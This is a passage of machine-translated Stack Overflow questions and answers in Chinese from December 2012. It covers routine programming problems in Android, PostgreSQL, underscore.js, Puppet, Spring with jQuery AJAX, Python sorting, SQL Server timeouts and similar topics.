            scroll_letra.smoothScrollBy(0, (int) (millisUntilFinished / 300000));
        }

        @Override
        public void onFinish() {

        }
    };
    ctimer.start();
    }
} 
```

创建方法后...我在 OnCreate 上调用它，将值作为参数传递...并在调用后停止它。

```
timerRol(100);
ctimer.cancel(); 
```

之后我创建搜索栏并在用户更改位置时调用该方法。

```
barraRolagem = (SeekBar) findViewById(R.exibir_musica.barraRolagem);
    barraRolagem.setVisibility(1);
    barraRolagem.setMax(5);
    barraRolagem.setProgress(0);
    final int[] crono = { 0, 750, 500, 100, 50, 1};

    barraRolagem.setOnSeekBarChangeListener(new SeekBar.OnSeekBarChangeListener() {

                public void onStopTrackingTouch(SeekBar seekBar) {
                    // TODO Auto-generated method stub
                }

                public void onStartTrackingTouch(SeekBar seekBar) {
                    // TODO Auto-generated method stub

                }

                public void onProgressChanged(SeekBar seekBar,
                        int progress, boolean fromUser) {

                    if((crono[progress] == 0)) {

                            ctimer.cancel();
                    }else{

                        Log.v(String.valueOf(crono[progress]), "valor do crono");
                        ctimer.cancel();
                        timerRol(crono[progress]);

                    }
                }
            }); 
```

# postgresql - 了解 Postgres 查询

> ID：13957571
> 
> 赞同：0
> 
> 时间：2012-12-19T17:11:34.013
> 
> 标签：postgresql

关于两者的区别...

```
select * from table_a where id != 30 and name != 'Kevin'; 
```

和

```
select * from table_a where id != 30 or name != 'Kevin'; 
```

第一个意思是，`"select all rows from table_a where the id is not 30 and the name is not Kevin"`。

因此，第一个查询将返回 {30, 'Bill'} 的 {Id, Name} 行。

但是，第二个意思是，`"select all rows from table_a where the id is not 30 or the name is not 'Kevin'"`。

所以上面的 {30, 'Bill'}**不会**从第二个查询中返回。

那正确吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:17:50.330

```
select * from table_a where id != 30 and name != 'Kevin'; 
```

> 因此，第一个查询将返回 {30, 'Bill'} 的 {Id, Name} 行。

不，它不会。

```
select * from table_a where id != 30 or name != 'Kevin'; 
```

> 所以上面的 {30, 'Bill'}**不会**从第二个查询中返回。

不，它会的。你有倒退的逻辑。去尝试一下。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-19T17:37:14.927

回顾：

```
A   B   not(A)  not(B)      AND     OR
1   1   0         0         0       0
1   0   0         1         0       1
0   1   1         0         0       1
0   0   1         1         1       1 
```

因此，只有在以下情况下，这两个查询才会返回相同的行：

1- id=30 和 name='Kevin'

或者

2- id!=30 和 name!='Kevin'

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-04-17T22:13:59.770

快速逻辑表达式转换技巧：

非（A 和 B）== 非 A 或非 B

非（A 或 B）== 非 A 且非 B

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-19T17:14:41.507

没有。第二个查询的意思是“选择 id 不是 30 或名称不是 'Kevin' 的所有行”，因此 'Bill' 的名称有资格包含在查询中的记录。

# underscore.js - 下划线模板：if else 语句出错

> ID：13957575
> 
> 赞同：4
> 
> 时间：2012-12-19T17:11:55.637
> 
> 标签：underscore.js

我在解析下划线模板时出错，我不断收到一条错误消息：

`Uncaught SyntaxError: Unexpected token else`

下面是模板：**使用 Jade**

```
script#viewLinksTemplate(type="text/template")
    table.table.table-condensed.table-striped
        caption Available links
        thead
            tr
                td link id
                td Name
                td View
                td Edit
                td Remove
        tbody
            {[ _.each(routes, function(route) { ]}

            tr
                td {{ route._id }}
                {[ if (typeof route.name !== 'undefined') { ]}
                td {{ route.name }}
                {[ } ]}
                {[ else { ]}
                td {{ route.stations.start.name }} - {{ route.stations.end.name }}
                {[ }; ]}
                td
                    a.btn.btn-primary(href="/route") View Route
                td
                    a.btn.btn-warning Edit Route
                td
                    a.btn.btn-danger Delete Route
            {[ }); ]} 
```

问题似乎出在 if/else 语句中。当我完全删除它时，模板上留下的部分会被渲染。

那么，我是否在语法上遗漏了一些东西？我所有的其他模板都有 javascript，并且可以正确呈现，除了这个带有 if/else 的模板。

谢谢

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-19T17:20:37.333

这是因为`if`语句的结尾和`else`位于两个不同的评估标签中。通过替换将它们合并为一个：

```
{[ } ]}
{[ else { ]} 
```

和：

```
{[ } else { ]} 
```

# tomcat - JSF 和 Tomcat 可能存在内存泄漏

> ID：13957576
> 
> 赞同：1
> 
> 时间：2012-12-19T17:11:56.830
> 
> 标签：tomcat, jsf-2, primefaces

每当我重新启动或停止 Tomcat 时都会收到此警告。

> 严重：Web 应用程序 [/WebApp] 创建了一个 ThreadLocal，其键类型为 [javax.faces.context.FacesContext$1]（值 [javax.faces.context.FacesContext$1@1fe1018d]），值类型为 [com.sun .faces.config.InitFacesContext]（值 [com.sun.faces.config.InitFacesContext@6d2ce054]）但在 Web 应用程序停止时无法将其删除。这很可能造成内存泄漏。

技术列表

*   Primefaces 3.4.2
*   JSF 2.1
*   Apache Tomcat 6.0.35
*   Java 1.6.0_37
*   JSTL 1.1
*   网豆 7.0.1
*   MySQL

想法？

干杯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-09T15:59:55.777

似乎是仍在内存中的剩余库。

主要问题似乎是随着时间的推移，库会耗尽所有内存并在 Tomcat 服务器上创建 PermGen 错误。

所以最好的办法是尽可能多地增加内存并偶尔重置网络服务器。

应该有一个更好的解决方案，但它躲避我。

# puppet - Puppet 通知服务错误

> ID：13957577
> 
> 赞同：0
> 
> 时间：2012-12-19T17:12:01.760
> 
> 标签：puppet

我尝试编写一个 puppet 配置以安装 lamp env。

但我对通知选项有疑问。

我有一个 apache conf：

```
class apache inherits apache::params {
    package { 'apache':
        name => "${apache::params::package}",
        ensure => present
    }

    service { 'apache':
        ensure    => running,
        name      => $apache::params::service,
        enable    => true,
        subscribe => Package['apache'],
    }
} 
```

和 php 模块配置：

```
define php::module(
    $notify         = $php::params::notify,
    $package_prefix = $php::params::module_package_prefix
) {
    package { "php-module-${name}":
        ensure  => present,
        name    => "${package_prefix}${name}",
        notify  => Service['apache'],
        require => [Class['apache'], Package['php', 'php-dev']]
    }
} 
```

但是当我启动 puppet 我有这个错误：

```
Error: Parameter notify failed on Php::Module[mcrypt]: No title provided and "apache" is not a valid resource reference 
```

我不明白为什么它说 apache 服务不是有效资源？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-20T05:36:53.637

我认为这里可能有2个问题：

1) Puppet 不喜欢 php::module 中的这一行：

```
 $notify         = $php::params::notify, 
```

您可以尝试删除它或检查 $php::params::notify 中的内容吗？（我没有看到你使用它）

2）你有类似的东西吗

```
include apache 
```

在您的 site.pp 中？在引用包含的资源之前，仍需要声明该类。

# java - 如何使用modelAttribute在ajax（jquery）中提交spring表单

> ID：13957581
> 
> 赞同：14
> 
> 时间：2012-12-19T17:12:19.420
> 
> 标签：java, jquery, spring, jsp

我是 Spring MVC 的新手。我有这样的表格，

`<form:form action="/myaction.htm" method="post" modelAttribute="myForm" id="formid">`和一个返回 json 的控制器

`public @ResponseBody ResultObject doPost(@ModelAttribute("myForm") MyForm myForm){ System.out.println("myform.input"); }`

我可以使用它提交这个，`$("#formid").submit();`并且我的 modelAttribute 工作正常，从 UI 中获取值。

我的问题是，如何以 jquery ajax 方式提交此表单？我试过这个，

```
$.ajax({
type:"post",
url:"/myaction.htm",
async: false,
dataType: "json",
success: function(){
alert("success");
}

}); 
```

表单已提交，但 modelAttribute 值为空，如何在提交时包含 modelAttribute 对象（表单正在使用的对象）？

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2012-12-19T17:17:25.660

您需要发布数据。我通常这样做的方式是使用以下内容。

```
var str = $("#myForm").serialize();

$.ajax({
    type:"post",
    data:str,
    url:"/myaction.htm",
    async: false,
    dataType: "json",
    success: function(){
       alert("success");
    }
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-19T17:16:44.493

您的 ModelAttributes 未填充，因为您没有将任何参数传递给服务器。表单数据必须发布到服务器

`$.post('myaction.htm', $('#formid').serialize())`发送 ajax 发布请求。

# php - 关于聊天应用的一点说明

> ID：13957584
> 
> 赞同：4
> 
> 时间：2012-12-19T17:12:23.623
> 
> 标签：php, mysql, node.js

我计划创建一个可供成千上万用户使用的聊天应用程序。最初我在网上做了很多教程，并阅读了很多关于 PHP 和 MySQL 聊天应用程序的内容。在此搜索过程中，我遇到很多人说 PHP 中的聊天应用程序对成千上万的用户都有好处。他们中的大多数人建议使用 NodeJS。我在这里遇到的问题是这些帖子都没有说明为什么 NodeJS 是好的。

从我阅读的所有 PHP 聊天教程中，似乎在两个用户之间的聊天会话期间，他们正在交换的消息被发送并返回到数据库。我的问题是：

1.  在 NodeJS 中，消息不是来回发送到数据库吗？
2.  NodeJS 是否将聊天消息保存在内存中或类似的东西中？
3.  它与 PHP 和 MySQL 有何不同？
4.  还是 NodeJS 根本不使用数据库？

有人可以帮助我了解聊天应用程序在 NodeJS 中是如何工作的吗？

我不是要代码片段。我想用文字来解释。我知道有很多关于 NodeJS 的教程，但我特别询问有关聊天应用程序的问题。您的解释将帮助我更好地理解某些事情。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T17:17:42.317

PHP 和 Node.js 的主要区别在于 Node.js 支持多线程和事件。

在 PHP 中，您必须定期 ping 服务器以获取新消息，*每个用户*都需要这样做。

在 Node.js 中，您可以实现更智能的解决方案。客户端 ping 服务器一次，只有在收到新消息时才得到响应。之后，您再次ping。

这极大地减少了服务器负载，并允许您同时处理更多用户。

# ruby - Ruby Rbenv 尝试从 Bundle 运行 Zeus，尽管它是一个全局 gem（使用 ZSH）

> ID：13957585
> 
> 赞同：5
> 
> 时间：2012-12-19T17:12:25.033
> 
> 标签：ruby, bundler, zsh, rbenv, zeus

（更新：由 zsh 引起的问题，请参阅接受的答案）

很久以前，我按照这个很棒的指南来使用 Rbenv 和捆绑器[https://gist.github.com/1384279](https://gist.github.com/1384279)并且在 Ruby Land 中一切都很好。（我安装正确）

Bundler gem 为当前的 ruby​​ 版本全局安装。每个项目的所有 gem 都是从它们各自的 gemfile 包安装的。

我正在尝试全局安装 Zeus（例如如何全局安装捆绑程序），而不是将其添加到每个项目的 gemfile 中。

```
joe@computer:~/some_project
> rbenv versions
  1.9.3-p194
* 1.9.3-p327-perf (set by /Users/joe/some_project/.rbenv-version)

joe@computer:~/.rbenv/versions/1.9.3-p327-perf/lib/ruby/gems/1.9.1/gems
> ls -a
.                   method_source-0.7.1 zeus-0.13.1
..                  rake-0.9.2.2
bundler-1.2.0.rc.2  rdoc-3.9.4 
```

我已经成功了，你可以看到 zeus 与捆绑器一起安装在全局范围内......但是：

```
joe@computer:~/some_project
> rbenv rehash

joe@computer:~/some_project
> zeus init
Users/joe/.rbenv/versions/1.9.3-p327-perf/lib/ruby/gems/1.9.1/gems/bundler-1.2.0.rc.2/lib/bundler/rubygems_integration.rb:147:in `block in replace_gem': zeus is not part of the bundle. Add it to Gemfile. (Gem::LoadError)
from /Users/joe/.rbenv/versions/1.9.3-p327-perf/bin/zeus:22:in `<main>' 
```

据我所知，正在寻找 zeus，就好像它是捆绑安装的，但它不是捆绑安装的，而是全局安装的。

如何让 shell 在捆绑 gem 之前查看全局 gem？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-20T05:43:55.020

如果我做对了，而你和我有同样的问题，而且你也在运行 zsh，那么这个问题是如果你安装了 bundler 插件，oh-my-zsh 会使用 bundler 自动包装一些命令。

见：[https ://github.com/robbyrussell/oh-my-zsh/pull/1507](https://github.com/robbyrussell/oh-my-zsh/pull/1507)

[https://github.com/robbyrussell/oh-my-zsh/pull/1138](https://github.com/robbyrussell/oh-my-zsh/pull/1138)

[https://github.com/heroku/heroku/issues/173](https://github.com/heroku/heroku/issues/173)

编辑：这已在 oh-my-zsh 中修复

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-05T10:56:56.040

如果您确实对 oh-my-zsh 有此问题，并且无论出于何种原因尚未更新，您可以在 zeus 前面加上反斜杠，例如：

```
% \zeus start
% \zeus g model Post title content:text
% \zeus rake db:migrate 
```

反斜杠的作用是运行覆盖任何别名的命令。请参阅 Wikipedia 上的此部分[http://en.wikipedia.org/wiki/Alias_(command)#Overriding_aliases](http://en.wikipedia.org/wiki/Alias_(command)#Overriding_aliases)

# silverlight - Silverlight - 将数据传递给用户控件的策略

> ID：13957587
> 
> 赞同：0
> 
> 时间：2012-12-19T17:12:30.853
> 
> 标签：silverlight

Silverlight5

从按钮单击 Tab1Data 我想将参数传递给 Tab2_1Data

我目前正在使用 MainPage 上的全局公共属性（！）进行此操作，每个 UserControl 都可以使用此[帮助器引用该属性](http://geekswithblogs.net/codingbloke/archive/2010/12/19/visual-tree-enumeration.aspx)

有没有更好的方法使用非 MVVM 方法来传递参数？

```
 <controls:TabControl Name="TabOverallMain">
                        <!-- Tab 1 -->
                        <controls:TabItem Header="Home Screen" IsSelected="True">
                            <UserControls:Tab1Data />
                        </controls:TabItem>

                        <!-- Tab 2 -->
                        <controls:TabItem Header="Admin">
                            <Grid>
                                <controls:TabControl>
                                    <!-- Tab 2_1 -->
                                    <controls:TabItem Header="Users">
                                        <UserControls:Tab2_1Data />
                                    </controls:TabItem> 
```

编辑：使用[这个](http://www.codeproject.com/Articles/42203/How-to-Implement-a-DependencyProperty)我在我的 Tab2_1Data 控件中实现了一个 DependencyProperty：

```
 public static readonly DependencyProperty CaptionProperty = DependencyProperty.Register("Caption", typeof(string), typeof(WidgetControl),null);

        public string Caption
        {
            get { return (string)GetValue(CaptionProperty); }
            set { SetValue(CaptionProperty, value); }
        } 
```

然后我通过以下方式从我的 Tab1Data 用户控件中引用它：

```
wid.Caption = "hello world"; 
```

现在这对我来说很好......虽然两者之间的数据绑定看起来也很好！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T20:09:26.230

由于您不想使用 MVVM，请尝试使用数据绑定。您需要将参数公开为第一个控件的依赖属性

这是一些伪代码。在 Tab1Data 上创建一个名为 MyParam 的依赖项属性

```
 public static readonly DependencyProperty MyParamProperty = DependencyProperty.Register("MyParam",
                int, typeof(Tab2_1Data), null);

public int MyParam
{
    get { return (int)GetValue(MyParamProperty); }
    set
    {
        SetValue(MyParamProperty, value);
    }
}

<controls:TabItem Header="Home Screen" IsSelected="True">
    <UserControls:Tab1Data x:Name="OneCtrl"  />
</controls:TabItem> 
```

然后在第二个控件上创建一个依赖属性（类似于上面），称为 ParamFromControlOne... 然后绑定它们

```
<UserControls:Tab2_1Data ParamFromControlOne="{Binding MyParam, ElementName=OneCtrl}" /> 
```

这没有使用记事本进行测试和组合，但这是我要走的路

# android - 从我的 android 应用程序中的 url 流式传输 wmv 视频

> ID：13957594
> 
> 赞同：0
> 
> 时间：2012-12-19T17:13:03.670
> 
> 标签：android, url, video, streaming, wmv

我正在为我的网站创建一个包含大量 wmv 视频文件的应用程序。我希望能够在我的应用程序中播放它们。我知道 android 不支持 wmv 文件，所以我的问题是：有什么方法可以让我在不更改我网站中所有视频格式的情况下做到这一点？通过代码（java - eclipse）或库对我的视频进行任何修改，是否有任何漏洞？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T19:06:45.247

我一直在尝试创建一个包含流媒体视频的网站，但我永远无法让 Android 设备使用它。然后我发现了这个...

[http://www.longtailvideo.com/blog/31646/the-pain-of-live-streaming-on-android](http://www.longtailvideo.com/blog/31646/the-pain-of-live-streaming-on-android)

# jquery - jQuery为JSON数组中的对象加载.each

> ID：13957597
> 
> 赞同：1
> 
> 时间：2012-12-19T17:13:17.283
> 
> 标签：jquery, ajax, json

我正在尝试为`.each`JSON 数组中的对象编写语句。

```
$.ajax({
    url: url,
    dataType: 'json',
    success: function(data){
        $.each(data, function (key, value){
            ...do stuff...
        }
}); 
```

问题是，它只返回一个结果，因为它只在我需要它为`.each`里面的对象做一个时才做一个。我确定它很简单，但我无法弄清楚它是什么。`data``.each``data``.each(data.something ...)`

**编辑** 每个评论请求，数据如下所示：

```
[["data1","data2","data3"],
 ["data1","data2","data3"],
 ["data1","data2","data3"]
] 
```

**编辑2**

这是我的工作代码的[JSFiddle](http://jsfiddle.net/xfgky/)。如果我将`.each`函数更改为只做一个`alert`它可以工作，但是当我尝试构建 div 时，它只会吐出一个条目。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T17:18:34.763

我最初建议使用 $.map() 创建一个数组。

但实际问题是 OP 在循环的每次迭代中都覆盖了 html。编辑我的回复以显示实际答案。

答案：OP 需要在他的 .each() 循环中将 .html() 更改为 .append() 。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-19T17:24:22.790

听起来你需要一个嵌套循环：

```
$.ajax({
    url: url,
    dataType: 'json',
    success: function(data){
        $.each(data, function (idx1, value1){
            $.each(value1, function (idx2, value2){
                //...do stuff...
            });
        });
    }); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-19T17:57:50.683

[你的小提琴](http://jsfiddle.net/xfgky/)的问题不是`.each`循环——而是你`.html()`用来添加代码，它将用你的新代码替换指定元素内的所有内容。

使用`.append()`代替，`.html()`你应该没问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-19T17:21:36.773

可能它不是JSON对象，只需执行以下操作

```
$.each($.parseJSON(data), function (key, value){
  ... stuff...
} 
```

根据对象，你应该做一个[Map](http://api.jquery.com/jQuery.map/)：

```
// Therefore, convert it to a real array
var realArray = $.makeArray( data )

// Now it can be used reliably with $.map()
$.map( realArray, function(val, i) {
  // do something 
}); 
```

**编辑 - 在小提琴上测试**

使用您的对象，我们可以检查它是否是嵌套数组，因此您必须对其进行双重循环：

```
var data = [["data1","data2","data3"],
 ["data1","data2","data3"],
 ["data1","data2","data3"]
];

$.each(data, function(key, item) {
    $.each(item, function(i, val) {
        alert(val);
    })
}); 
```

[小提琴](http://jsfiddle.net/GQJqE/)

**编辑 2 - 适合您情况的代码！**

```
$.ajax({
    url: url,
    dataType: 'json',
    success: function(data){
        $.each(data, function(key, item) {
            $.each(item, function(i, val) {
                alert(val);
            })
        }
    }
}); 
```

希望能帮助到你！！

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-19T17:24:52.220

再使用一个循环

```
$.each(data, function(key, value) {
    $.each(value, function(i, val) {
        console.log(val)
    })
})​ 
```

**[检查小提琴](http://jsfiddle.net/sushanth009/huNFQ/)**

# actionscript-3 - 我需要删除由不同 swf 文件加载的已加载 swf 文件

> ID：13957605
> 
> 赞同：0
> 
> 时间：2012-12-19T17:13:54.327
> 
> 标签：actionscript-3, flash, flash-cs5

我有一个加载到我的主 swf 文件 (swf1) 中的 swf 文件 (swf2)。单击一个按钮（位于加载的 swf 文件 swf2 中），我需要停止 swf2 的运行并加载新的 swf（swf3）。

我正在使用 removeChild(loader);

但问题是加载器在父（swf1）swf中，我如何引用它？

对不起，如果这不是足够的信息，我不是这里的专家。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T01:08:17.573

我理解这一点的方式是你有 swf1 加载 swf2。Swf2 包含一个按钮，按下该按钮会导致 swf1 卸载 swf2 并加载 swf3。

有几种方法可以在加载的 swf 和它们的父对象之间进行通信。一种方法（我通常根据上下文使用的方法）是您可以让加载的 swf 引发父级可以侦听和捕获的事件。在这种情况下，您加载的 swf2 可能会引发父 swf1 可以捕获的“关闭”事件，然后用于触发 swf2 的卸载（并加载 swf3）。

对于另一种方法，检查您是否可以通过它的 parent 属性访问已加载的子 swf 内的父（这将是主要的加载 swf，swf1）。我不能总是推荐这个，因为如果你将 swf2 与另一个加载器一起使用，将来可能会不清楚“父级”可能指的是什么。

不过要考虑其他事情，如果这个按钮是用来控制子 swfs 的加载和卸载，那么将它移到加载器本身是否更有意义，因为那是行为所在？这也将消除问题。

# java - Java 虚拟机会在 WinRT 上运行吗？

> ID：13957609
> 
> 赞同：2
> 
> 时间：2012-12-19T17:14:02.650
> 
> 标签：java, jvm, windows-runtime

这似乎是一个简单的问题，但我找不到有意义的答案，只有很多猜测。

此外，如果答案是肯定的，它会是哪个 JVM，Oracle 的还是微软修补的东西？

具体来说：我有一个在 JRE 7 上运行的 Java 桌面应用程序，它会在 WinRT 上运行吗？我的意思是，我可以在 WinRT 上安装 JRE 7 吗？它会毫无问题地运行吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-19T20:39:03.353

是和不是。

使用 Windows 运行时 API 和可从 Windows 应用商店应用程序使用的 Windows API 部分当然可以实现 Java 虚拟机，或者至少是虚拟机的大部分。但是，这样的 JVM 需要是解释型 JVM，而不是 JIT 编译型 JVM。JIT 编译需要能够更改内存保护（以允许执行生成的代码），但`VirtualProtect`不能从 Windows 应用商店应用程序中的用户代码调用更改内存保护（和朋友）的 API。

那么，您能否实现一个可在 Windows 应用商店应用程序中使用的解释型 JVM？大概。不过，是否有可能实现一个性能足够好以供使用的 JVM 完全是另一回事。

# python - Python：奇怪的“pnc =：N”错误消息

> ID：13957617
> 
> 赞同：1
> 
> 时间：2012-12-19T17:14:50.617
> 
> 标签：python

我在一个特别大的输入集上运行我的 Python[最长公共子序列](http://en.wikipedia.org/wiki/Longest_common_subsequence_problem)算法，将生成的 LCS 长度存储在一个二维 numpy 数组中。我注意到它随着时间的推移而放缓。大约三分之一的时候，它慢了下来，然后崩溃了，打印出神秘的错误消息“pnc =：N”，之后没有换行符（我的程序在停止之前又打印了一行输出）。在这一点上，它似乎也释放了大量分配的内存。有谁知道这意味着什么？

编辑：崩溃的代码部分是：

```
#m and n are both around 12,000
lengths = np.empty((m+1, n+1), dtype=np.uint)
lengths[0,:] = 0
lengths[1:,0] = 0

if m > 0 and n > 0:
    for i in xrange(1, m + 1):
        for j in xrange(1, n + 1):
            #eqTest is a function comparing two sequence elements, like cmp
            eq = eqTest(a[i-1], b[j-1])
            if eq:
                lengths[i,j] = lengths[i-1,j-1] + 1
            elif lengths[i-1,j] >= lengths[i,j-1]:
                lengths[i,j] = lengths[i-1,j]
            else:
                lengths[i,j] = lengths[i,j-1] 
```

我不确定是什么导致它随着时间的推移变慢或使用更多资源，因为整个 LCS 长度数组是在开始时分配然后填充的。我正在使用的相等性测试很难描述，因为它部分是用 C 编写的，但它是有效的：

```
def eqTest(l1, l2):
    words1 = l1.split()
    words2 = l2.split()
    if len(words1) == len(words2):
        for i in xrange(len(words1)):
            #MATCHERS is a list of around 10 compiled regular expressions
            for m in MATCHERS:
                if m.match(s1) is not None and m.match(s2) is not None:
                    break
            else:
                result = False
                break
        else:
            result = True
    else:
        result = False
return result 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T18:20:18.227

如果“然后崩溃”意味着程序终止，那么“此时它似乎也释放了大量分配的内存”。是操作系统回收分配给进程的内存的效果。

根据您的描述，原因可能是您的程序超出了操作系统对进程大小的限制（至少会导致 Linux 崩溃）。

至于更多，这将有助于查看您的代码。您应该*始终*发布您的代码。

# internet-explorer - 用户代理中的“MSIE”Trident 版本控制不一致

> ID：13957620
> 
> 赞同：0
> 
> 时间：2012-12-19T17:14:54.383
> 
> 标签：internet-explorer, user-agent

我正在开发一个项目，该项目根据用户代理中提供的浏览器引擎版本激活一组 CSS/Javascript 功能。

```
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/6.0; .NET4.0E; .NET4.0C) 
```

[众所周知](http://en.wikipedia.org/wiki/Trident_%28layout_engine%29#Versions)，**Trident 6.0**仅在 MSIE 10 中可用。我不明白旧的 MSIE 7.0 用户代理如何包含此版本信息。

这背后的原因是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:30:10.500

在*兼容性视图*模式下是 IE10；

> 在兼容性视图中显示网页时，Internet Explorer 10 以 IE7 标准模式显示该页面，这与 Internet Explorer 9 和 Windows Internet Explorer 8 的行为一致。

[http://msdn.microsoft.com/en-us/library/ie/hh869301(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/ie/hh869301%28v=vs.85%29.aspx)

# c# - 同一张表上的多个事务，同时

> ID：13957623
> 
> 赞同：0
> 
> 时间：2012-12-19T17:15:07.420
> 
> 标签：c#, sql, sql-server, deadlock, sqltransaction

我遇到了一个问题，我有一个可以由多个线程编辑的表，每个线程创建一个事务来处理这个表，如果一个事务需要很长时间才能完成，其他线程将抛出异常“查询超时过期” . 我猜交易的某处有超时设置。

我可以使用线程锁来处理这个问题；但是，有没有办法在服务器端做到这一点？我可以在 SQL Server 中创建锁吗？任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T17:24:22.850

您收到的超时不是“事务”超时。这是一般查询超时。此查询可以是 Select、Update、Delete 等。超时值通常在连接字符串中控制。

我不相信您可以专门锁定 SQL Server 中的行、页或表，这可能是件好事。坦率地说，这不是问题的症结所在。您的交易执行时间过长。它们不应该花费太长时间导致其他查询超时（可能至少 30 秒）。由于交易需要这么长时间，您将让您的服务器陷入瘫痪。一笔交易最多应该保持几秒钟。

我建议您首先查看需要事务的语句（更新、删除或插入），通过 SSMS 中的查询分析器运行它们，并确保没有进行表或索引扫描。我的猜测是这种情况正在发生，并且事务中涉及的表偏大（数十万行或更多）。

# python - 按其他两个列表对 Python 中的列表进行排序

> ID：13957624
> 
> 赞同：13
> 
> 时间：2012-12-19T17:15:08.713
> 
> 标签：python, list, sorting

[我的问题与这两个链接1](https://stackoverflow.com/questions/3979872/python-how-to-sort-a-complex-list-on-two-different-keys)和[2](https://stackoverflow.com/questions/5212870/sorting-a-python-list-by-two-criteria)非常相似：

我有三个不同的列表。我想根据 List2 对 List1 进行排序（按升序排列）。但是，我在 List2 中有重复。然后我想按 List3 对这些重复进行排序（按降序排列）。够迷惑吗？

是）我有的：

```
List1 = ['a', 'b', 'c', 'd', 'e']
List2 = [4, 2, 3, 2, 4]
List3 = [0.1, 0.8, 0.3, 0.6, 0.4] 
```

我想要的是：

```
new_List1 = ['b', 'd', 'c', 'e', 'a'] 
```

'b' 出现在 'd' 之前，因为 0.8 > 0.6。'e' 出现在 'a' 之前，因为 0.4 > 0.1。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-19T17:19:09.443

我认为您应该能够通过以下方式做到这一点：

```
paired_sorted = sorted(zip(List2,List3,List1),key = lambda x: (x[0],-x[1]))
l2,l3,l1 = zip(*paired_sorted) 
```

在行动：

```
>>> List1 = ['a', 'b', 'c', 'd', 'e']
>>> List2 = [4, 2, 3, 2, 4]
>>> List3 = [0.1, 0.8, 0.3, 0.6, 0.4]
>>> paired_sorted = sorted(zip(List2,List3,List1),key = lambda x: (x[0],-x[1]))
>>> l2,l3,l1 = zip(*paired_sorted)
>>> print l1
('b', 'd', 'c', 'e', 'a') 
```

这是它的工作原理。首先，我们使用 匹配列表中的相应元素`zip`。然后，我们首先根据 List2 中的项目和（否定的）List3 中的项目对这些元素进行排序。然后我们只需要使用和参数解包再次拉出 List1 元素`zip`——尽管如果您想确保在一天结束时有一个列表而不是元组，您可以使用列表理解轻松完成。

如果您不能轻易地否定 List3 中的值——例如，如果它们是字符串，这将变得更加困难。您需要在 2 遍中进行排序：

```
paired = zip(List2,List3,List1)
rev_sorted = sorted(paired,reverse=True,key=lambda x: x[1])  #"minor" sort first
paired_sorted = sorted(rev_sorted,key=lambda x:x[0])         #"major" sort last
l2,l3,l1 = zip(*paired_sorted) 
```

（如果您愿意，可以使用上面`operator.itemgetter(1)`的代替`lambda x:x[1]`）。这是有效的，因为 python 排序是“稳定的”。它不会重新排序“相等”的元素。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-12-19T17:19:26.147

这需要一个 decorate-sort-undecorate 步骤：

```
decorated = zip(List1, List2, List3)
decorated.sort(key=lambda v: (v[1], -v[2]))
new_list1 = [v[0] for v in decorated] 
```

或者，合并为一行：

```
new_list1 = [v[0] for v in sorted(zip(List1, List2, List3), key=lambda v: (v[1], -v[2]))] 
```

输出：

```
>>> List1 = ['a', 'b', 'c', 'd', 'e']
>>> List2 = [4, 2, 3, 2, 4]
>>> List3 = [0.1, 0.8, 0.3, 0.6, 0.4]
>>> new_list1 = [v[0] for v in sorted(zip(List1, List2, List3), key=lambda v: (v[1], -v[2]))]
>>> new_list1
['b', 'd', 'c', 'e', 'a'] 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-19T17:20:18.847

```
>>> [v for i, v in sorted(enumerate(List1), key=lambda i_v: (List2[i_v[0]], -List3[i_v[0]]))]
['b', 'd', 'c', 'e', 'a'] 
```

这通过使用索引对索引/值对进行排序，以从其他列表中获取相应的值，以在用于排序的键函数中使用`sorted()`，然后使用列表推导仅提取值。

这是一个较短的替代方案，它仅对索引进行排序，然后使用这些索引从 中获取值`List1`：

```
>>> [List1[i] for i in sorted(range(len(List1)), key=lambda i: (List2[i], -List3[i]))]
['b', 'd', 'c', 'e', 'a'] 
```

# javascript - FancyBox 画廊内的图像映射

> ID：13957626
> 
> 赞同：1
> 
> 时间：2012-12-19T17:15:09.667
> 
> 标签：javascript, jquery, fancybox

我正在尝试将图像映射添加到 fancybox 画廊，如下所示：

```
 http://jsfiddle.net/ffZ7B/ 
```

我正在尝试创建我们印刷目录的在线复制，这将允许灯箱的不同区域链接到我们网站上的不同项目页面。

这是我正在使用的代码，它适用于fancybox。我不确定的主要部分是将代码放在小提琴的“JavaScript”部分下的位置。在此先感谢 - 我更像是一个 .NET 人，所以 JavaScript 对我来说是新的，但由于平台限制是必要的。

```
<html>
<head>
<script type="text/javascript" src="http://mysite.com/catalog/lib/jquery-1.8.2.min.js">        </script>
<script type="text/javascript" src="http://mysite.com/catalog/lib/jquery.mousewheel-3.0.6.pack.js"></script>
<script type="text/javascript" src="http://mysite.com/catalog/source/jquery.fancybox.js?v=2.1.3"></script>
